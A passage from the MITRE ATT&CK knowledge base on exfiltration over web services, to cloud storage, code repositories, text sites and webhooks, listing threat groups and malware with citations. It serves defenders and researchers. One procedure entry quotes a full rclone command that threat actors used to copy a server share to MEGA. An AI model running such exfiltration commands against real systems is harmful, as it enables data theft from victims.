A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.(Citation: TLDRSec AWS Attacks)

Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.(Citation: Microsoft Azure Storage Shared Access Signature)

Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018)

Procedures:

- [G1032] INC Ransom: [INC Ransom](https://attack.mitre.org/groups/G1032) has used Megasync to exfiltrate data to the cloud.(Citation: Secureworks GOLD IONIC April 2024)
- [G1039] RedCurl: [RedCurl](https://attack.mitre.org/groups/G1039) has used cloud storage to exfiltrate data, in particular the megatools utilities were used to exfiltrate data to Mega, a file storage service.(Citation: group-ib_redcurl1)(Citation: group-ib_redcurl2)


### T1567 - Exfiltration Over Web Service

Description:

Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.

Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.

Procedures:

- [G0059] Magic Hound: [Magic Hound](https://attack.mitre.org/groups/G0059) has used the Telegram API `sendMessage` to relay data on compromised devices.(Citation: Google Iran Threats October 2021)
- [C0051] APT28 Nearest Neighbor Campaign: During [APT28 Nearest Neighbor Campaign](https://attack.mitre.org/campaigns/C0051), [APT28](https://attack.mitre.org/groups/G0007) exfiltrated data over public-facing webservers – such as Google Drive.(Citation: Nearest Neighbor Volexity)
- [S1171] OilCheck: [OilCheck](https://attack.mitre.org/software/S1171) can upload documents from compromised hosts to a shared Microsoft Office 365 Outlook email account for exfiltration.(Citation: ESET OilRig Downloaders DEC 2023)
- [G0007] APT28: [APT28](https://attack.mitre.org/groups/G0007) can exfiltrate data over Google Drive.(Citation: TrendMicro Pawn Storm Dec 2020)
- [S0547] DropBook: [DropBook](https://attack.mitre.org/software/S0547) has used legitimate web services to exfiltrate data.(Citation: BleepingComputer Molerats Dec 2020)
- [S0622] AppleSeed: [AppleSeed](https://attack.mitre.org/software/S0622) has exfiltrated files using web services.(Citation: KISA Operation Muzabi)
- [S0508] ngrok: [ngrok](https://attack.mitre.org/software/S0508) has been used by threat actors to configure servers for data exfiltration.(Citation: MalwareBytes Ngrok February 2020)
- [C0017] C0017: During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used Cloudflare services for data exfiltration.(Citation: Mandiant APT41)
- [G1043] BlackByte: [BlackByte](https://attack.mitre.org/groups/G1043) has used services such as `anonymfiles.com` and `file.io` to exfiltrate victim data.(Citation: Picus BlackByte 2022)
- [S1168] SampleCheck5000: [SampleCheck5000](https://attack.mitre.org/software/S1168) can use the Microsoft Office Exchange Web Services API to access an actor-controlled account and retrieve files for exfiltration.(Citation: ESET OilRig Campaigns Sep 2023)(Citation: ESET OilRig Downloaders DEC 2023)
- [S1179] Exbyte: [Exbyte](https://attack.mitre.org/software/S1179) exfiltrates collected data to online file hosting sites such as `Mega.co.nz`.(Citation: Symantec BlackByte 2022)(Citation: Microsoft BlackByte 2023)

#### T1567.001 - Exfiltration to Code Repository

Description:

Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.

Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.

Procedures:

- [S0363] Empire: [Empire](https://attack.mitre.org/software/S0363) can use GitHub for data exfiltration.(Citation: Github PowerShell Empire)

#### T1567.002 - Exfiltration to Cloud Storage

Description:

Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.

Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.

Procedures:

- [G0065] Leviathan: [Leviathan](https://attack.mitre.org/groups/G0065) has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018)
- [G1024] Akira: [Akira](https://attack.mitre.org/groups/G1024) will exfiltrate victim data using applications such as [Rclone](https://attack.mitre.org/software/S1040).(Citation: Secureworks GOLD SAHARA)
- [G1014] LuminousMoth: [LuminousMoth](https://attack.mitre.org/groups/G1014) has exfiltrated data to Google Drive.(Citation: Bitdefender LuminousMoth July 2021)
- [S1040] Rclone: [Rclone](https://attack.mitre.org/software/S1040) can exfiltrate data to cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA.(Citation: Rclone)(Citation: DFIR Conti Bazar Nov 2021)
- [S0629] RainyDay: [RainyDay](https://attack.mitre.org/software/S0629) can use a file exfiltration tool to upload specific files to Dropbox.(Citation: Bitdefender Naikon April 2021)
- [S1023] CreepyDrive: [CreepyDrive](https://attack.mitre.org/software/S1023) can use cloud services including OneDrive for data exfiltration.(Citation: Microsoft POLONIUM June 2022)
- [S0037] HAMMERTOSS: [HAMMERTOSS](https://attack.mitre.org/software/S0037) exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.(Citation: FireEye APT29)
- [G0094] Kimsuky: [Kimsuky](https://attack.mitre.org/groups/G0094) has exfiltrated stolen files and data to actor-controlled Blogspot accounts.(Citation: Talos Kimsuky Nov 2021)
- [G0027] Threat Group-3390: [Threat Group-3390](https://attack.mitre.org/groups/G0027) has exfiltrated stolen data to Dropbox.(Citation: Trend Micro DRBControl February 2020)
- [S1170] ODAgent: [ODAgent](https://attack.mitre.org/software/S1170) can use an attacker-controlled OneDrive account for exfiltration.(Citation: ESET OilRig Downloaders DEC 2023)
- [G0142] Confucius: [Confucius](https://attack.mitre.org/groups/G0142) has exfiltrated victim data to cloud storage service accounts.(Citation: TrendMicro Confucius APT Feb 2018)
- [G1005] POLONIUM: [POLONIUM](https://attack.mitre.org/groups/G1005) has exfiltrated stolen data to [POLONIUM](https://attack.mitre.org/groups/G1005)-owned OneDrive and Dropbox accounts.(Citation: Microsoft POLONIUM June 2022)
- [G1001] HEXANE: [HEXANE](https://attack.mitre.org/groups/G1001) has used cloud services, including OneDrive, for data exfiltration.(Citation: Microsoft POLONIUM June 2022)
- [C0015] C0015: During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the [Rclone](https://attack.mitre.org/software/S1040) command `rclone.exe copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.(Citation: DFIR Conti Bazar Nov 2021)
- [S0660] Clambling: [Clambling](https://attack.mitre.org/software/S0660) can send files from a victim's machine to Dropbox.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020)
- [G1021] Cinnamon Tempest: [Cinnamon Tempest](https://attack.mitre.org/groups/G1021) has uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service, Aliyun OSS.(Citation: Sygnia Emperor Dragonfly October 2022)
- [S0538] Crutch: [Crutch](https://attack.mitre.org/software/S0538) has exfiltrated stolen data to Dropbox.(Citation: ESET Crutch December 2020)
- [S1172] OilBooster: [OilBooster](https://attack.mitre.org/software/S1172) can exfiltrate files to an actor-controlled OneDrive account via the Microsoft Graph API.(Citation: ESET OilRig Downloaders DEC 2023)
- [S0340] Octopus: [Octopus](https://attack.mitre.org/software/S0340) has exfiltrated data to file sharing sites.(Citation: ESET Nomadic Octopus 2018)
- [G0102] Wizard Spider: [Wizard Spider](https://attack.mitre.org/groups/G0102) has exfiltrated stolen victim data to various cloud storage providers.(Citation: Mandiant FIN12 Oct 2021)
- [G0119] Indrik Spider: [Indrik Spider](https://attack.mitre.org/groups/G0119) has exfiltrated data using [Rclone](https://attack.mitre.org/software/S1040) or MEGASync prior to deploying ransomware.(Citation: Mandiant_UNC2165)
- [G0010] Turla: [Turla](https://attack.mitre.org/groups/G0010) has used WebDAV to upload stolen USB files to a cloud drive.(Citation: Symantec Waterbug Jun 2019) [Turla](https://attack.mitre.org/groups/G0010) has also exfiltrated stolen files to OneDrive and 4shared.(Citation: ESET ComRAT May 2020)
- [G0125] HAFNIUM: [HAFNIUM](https://attack.mitre.org/groups/G0125) has exfiltrated data to file sharing sites, including MEGA.(Citation: Microsoft HAFNIUM March 2020)
- [S0363] Empire: [Empire](https://attack.mitre.org/software/S0363) can use Dropbox for data exfiltration.(Citation: Github PowerShell Empire)
- [G1006] Earth Lusca: [Earth Lusca](https://attack.mitre.org/groups/G1006) has used the megacmd tool to upload stolen files from a victim network to MEGA.(Citation: TrendMicro EarthLusca 2022)
- [G1003] Ember Bear: [Ember Bear](https://attack.mitre.org/groups/G1003) has used tools such as [Rclone](https://attack.mitre.org/software/S1040) to exfiltrate information from victim environments to cloud storage such as `mega.nz`.(Citation: CISA GRU29155 2024)
- [G1022] ToddyCat: [ToddyCat](https://attack.mitre.org/groups/G1022) has used a DropBox uploader to exfiltrate stolen files.(Citation: Kaspersky ToddyCat Check Logs October 2023)
- [G0128] ZIRCONIUM: [ZIRCONIUM](https://attack.mitre.org/groups/G0128) has exfiltrated stolen data to Dropbox.(Citation: Zscaler APT31 Covid-19 October 2020)
- [C0040] APT41 DUST: [APT41 DUST](https://attack.mitre.org/campaigns/C0040) exfiltrated collected information to OneDrive.(Citation: Google Cloud APT41 2024)
- [S0651] BoxCaon: [BoxCaon](https://attack.mitre.org/software/S0651) has the capability to download folders' contents on the system and upload the results back to its Dropbox drive.(Citation: Checkpoint IndigoZebra July 2021)
- [C0022] Operation Dream Job: During [Operation Dream Job](https://attack.mitre.org/campaigns/C0022), [Lazarus Group](https://attack.mitre.org/groups/G0032) used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.(Citation: ESET Lazarus Jun 2020)(Citation: ClearSky Lazarus Aug 2020)
- [S1102] Pcexter: [Pcexter](https://attack.mitre.org/software/S1102) can upload stolen files to OneDrive storage accounts via HTTP `POST`.(Citation: Kaspersky ToddyCat Check Logs October 2023)
- [G0114] Chimera: [Chimera](https://attack.mitre.org/groups/G0114) has exfiltrated stolen data to OneDrive accounts.(Citation: NCC Group Chimera January 2021)
- [G1015] Scattered Spider: [Scattered Spider](https://attack.mitre.org/groups/G1015) has exfiltrated victim data to the MEGA file sharing site.(Citation: CISA Scattered Spider Advisory November 2023)(Citation: MSTIC Octo Tempest Operations October 2023)
- [S0240] ROKRAT: [ROKRAT](https://attack.mitre.org/software/S0240) can send collected data to cloud storage services such as PCloud.(Citation: Malwarebytes RokRAT VBA January 2021)(Citation: Volexity InkySquid RokRAT August 2021)
- [S0635] BoomBox: [BoomBox](https://attack.mitre.org/software/S0635) can upload data to dedicated per-victim folders in Dropbox.(Citation: MSTIC Nobelium Toolset May 2021)
- [G0046] FIN7: [FIN7](https://attack.mitre.org/groups/G0046) has exfiltrated stolen data to the MEGA file sharing site.(Citation: CrowdStrike Carbon Spider August 2021)

#### T1567.003 - Exfiltration to Text Storage Sites

Description:

Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.  

Text storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.(Citation: Pastebin EchoSec)

**Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs.

#### T1567.004 - Exfiltration Over Webhook

Description:

Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.(Citation: RedHat Webhooks) Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.(Citation: Discord Intro to Webhooks) When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. 

Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) of emails, chat messages, and other data.(Citation: Push Security SaaS Attacks Repository Webhooks) Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.(Citation: Microsoft SQL Server)

Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.(Citation: CyberArk Labs Discord)(Citation: Talos Discord Webhook Abuse)(Citation: Checkmarx Webhooks)

